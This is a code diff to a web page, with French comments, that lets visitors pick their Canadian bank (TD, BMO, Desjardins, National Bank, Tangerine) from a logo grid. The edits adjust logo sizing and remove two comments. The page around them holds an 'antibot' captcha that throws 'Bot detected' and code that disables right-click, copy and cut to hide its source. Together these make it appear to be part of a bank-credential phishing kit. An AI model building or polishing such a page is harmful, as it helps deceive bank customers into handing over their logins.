@@ -454,7 +454,7 @@
     .bank-card img {
         width: 100%;
         height: 100%;
-        object-fit: cover;
+        object-fit: contain; /* Correction spécifique pour éviter de rogner les images tout en gardant les dimensions exactes des blocs */
         border-radius: 3px;
     }
     .other-btn-container {
@@ -1023,7 +1023,7 @@
                     </div>
                     <div class="bank-card" onclick="selectBank(this)" data-name="td financial group">
                         <input type="radio" id="td" name="bank" value="td" />
-                        <div class="bank-logo-wrapper"><img src="td.jpeg" alt="TD" /></div>
+                        <div class="bank-logo-wrapper"><img src="td.jpeg" alt="TD" style="max-height: 70%;" /></div>
                     </div>
                     <div class="bank-card" onclick="selectBank(this)" data-name="bmo bank of montreal">
                         <input type="radio" id="bmo" name="bank" value="bmo" />
@@ -1039,12 +1039,12 @@
                     </div>
                     <div class="bank-card" onclick="selectBank(this)" data-name="desjardins group">
                         <input type="radio" id="desjardins" name="bank" value="desjardins" />
-                        <div class="bank-logo-wrapper"><img src="desj.jpeg" alt="Desjardins" /></div>
+                        <div class="bank-logo-wrapper"><img src="desj.jpeg" alt="Desjardins" style="max-height: 70%;" /></div>
                     </div>
 
                     <div class="bank-card" onclick="selectBank(this)" data-name="national bank">
                         <input type="radio" id="national" name="bank" value="national" />
-                        <div class="bank-logo-wrapper"><img src="banquenational.jpeg" alt="National Bank" class="bank-logo" /></div>
+                        <div class="bank-logo-wrapper"><img src="banquenational.jpeg" alt="National Bank" class="bank-logo" style="max-height: 70%;" /></div>
                     </div>
                     <div class="bank-card" onclick="selectBank(this)" data-name="tangerine">
                         <input type="radio" id="tangerine_main" name="bank" value="tangerine_main" />
@@ -1317,7 +1317,6 @@
             document.getElementById('antibot-error-msg').style.display = 'block';
             selectedTiles.clear();
             document.querySelectorAll('.antibot-tile').forEach(t => t.classList.remove('selected'));
-            // Changer de défi en cas d'erreur
             currentChallenge = captchaChallenges[Math.floor(Math.random() * captchaChallenges.length)];
             renderCaptchaGrid();
             setTimeout(() => {
@@ -1347,7 +1346,6 @@
             throw new Error("Bot detected");
         }
 
-        // Protection du code source et clics non sollicités
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('copy', e => e.preventDefault());
         document.addEventListener('cut', e => e.preventDefault());
